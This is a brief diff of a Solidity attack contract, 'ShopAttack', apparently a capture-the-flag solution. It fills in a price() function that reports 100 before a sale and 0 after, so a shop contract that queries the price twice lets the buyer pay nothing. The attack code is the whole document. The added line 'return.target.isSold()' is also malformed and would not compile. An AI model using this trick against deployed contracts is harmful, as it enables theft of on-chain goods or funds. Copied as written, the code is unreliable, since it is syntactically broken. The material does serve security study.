@@ -12,5 +12,7 @@ contract ShopAttack is Buyer {
         target.buy();
     }
 
-    function price() public view override returns (uint256)
+    function price() public view override returns (uint256) {
+        return.target.isSold() ? 0 : 100;
+    }
 }
